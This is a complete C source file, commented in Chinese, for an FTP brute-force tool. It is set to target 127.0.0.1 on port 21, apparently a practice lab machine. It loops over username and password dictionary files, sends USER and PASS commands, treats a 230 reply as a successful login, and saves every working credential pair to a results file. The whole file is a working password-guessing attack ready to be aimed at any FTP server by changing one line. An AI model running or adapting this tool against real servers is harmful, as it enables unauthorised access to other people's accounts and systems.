/* 
 * 仅依赖 Linux 原生 Socket 库 + stdio/strings 
 * 编译命令: gcc ftp_brute.c -o ftp_brute
 */

#include <stdio.h>      // 用于 printf, fprintf, fopen, fgets
#include <string.h>     // 用于 strcmp, strlen, strstr
#include <sys/socket.h> // [必须] 用于 socket, connect, send, recv
#include <netinet/in.h> // [必须] 用于 sockaddr_in 结构体
#include <arpa/inet.h>  // [必须] 用于 inet_pton (IP转换)
#include <unistd.h>     // [必须] 用于 close (关闭连接)

#define TARGET_IP "127.0.0.1" // 靶机 IP 
#define TARGET_PORT 21        // FTP 默认端口
#define BUF_SIZE 1024

// 辅助函数：发送数据并检查错误
void safe_send(int sock, const char *data) {
    send(sock, data, strlen(data), 0);
}

// 辅助函数：接收服务器响应
// 返回码：提取前三位数字 (如 220, 331, 230)
int get_response(int sock, char *buf) {
    memset(buf, 0, BUF_SIZE);
    int n = recv(sock, buf, BUF_SIZE - 1, 0);
    if (n <= 0) return -1;
    
    buf[n] = '\0';
    // 简单提取前三位作为状态码
    buf[3] = '\0'; 
    return atoi(buf); 
}

// 核心逻辑：尝试一次登录
// 返回 1 表示成功，0 表示失败
int try_login(const char *user, const char *pass) {
    int sock;
    struct sockaddr_in addr;
    char buffer[BUF_SIZE];

    // 1. 创建 Socket (TCP)
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;

    // 2. 配置服务器地址
    addr.sin_family = AF_INET;
    addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &addr.sin_addr);

    // 3. 连接服务器
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return 0; // 连接失败（可能是靶机没开）
    }

    // 4. 读取欢迎信息 (通常是 220)
    if (get_response(sock, buffer) != 220) {
        close(sock);
        return 0;
    }

    // 5. 发送用户名 (USER user\r\n)
    sprintf(buffer, "USER %s\r\n", user);
    safe_send(sock, buffer);
    
    // 6. 检查用户名响应 (通常是 331)
    if (get_response(sock, buffer) != 331) {
        close(sock);
        return 0;
    }

    // 7. 发送密码 (PASS pass\r\n)
    sprintf(buffer, "PASS %s\r\n", pass);
    safe_send(sock, buffer);

    // 8. 检查最终结果 (230 代表登录成功)
    int code = get_response(sock, buffer);
    close(sock); // 无论成败，立即断开以重置状态
    
    return (code == 230) ? 1 : 0;
}

int main() {
    FILE *f_user, *f_pass, *f_ret;
    char user[100], pass[100];
    
    printf("=== FTP Brute Force Tool (Native C) ===\n");
    printf("Target: %s:%d\n", TARGET_IP, TARGET_PORT);

    // 打开字典文件
    f_user = fopen("user.txt", "r");
    f_pass = fopen("pass.txt", "r");
    f_ret = fopen("ret.txt", "w"); // 结果保存文件

    if (!f_user || !f_pass || !f_ret) {
        printf("Error: Cannot open dictionary files!\n");
        return 1;
    }

    // 简单的双重循环暴力破解
    // 注意：这里假设 user.txt 和 pass.txt 内容较少，全部载入内存或逐行读取
    // 为了演示清晰，这里采用“重置文件指针”的笨办法遍历所有组合
    
    while (fgets(user, sizeof(user), f_user)) {
        // 去除换行符
        user[strcspn(user, "\r\n")] = 0; 
        
        rewind(f_pass); // 每次换新用户，密码本从头读
        
        while (fgets(pass, sizeof(pass), f_pass)) {
            pass[strcspn(pass, "\r\n")] = 0;
            
            printf("Trying: %s / %s ... ", user, pass);
            
            if (try_login(user, pass)) {
                printf("[SUCCESS!]\n");
                // 写入结果文件
                fprintf(f_ret, "Found -> User: %s | Pass: %s\n", user, pass);
                fflush(f_ret); // 立即刷新缓冲区，防止崩溃丢失数据
            } else {
                printf("Failed\n");
            }
        }
    }

    fclose(f_user);
    fclose(f_pass);
    fclose(f_ret);
    printf("\nDone. Results saved to ret.txt\n");
    return 0;
}
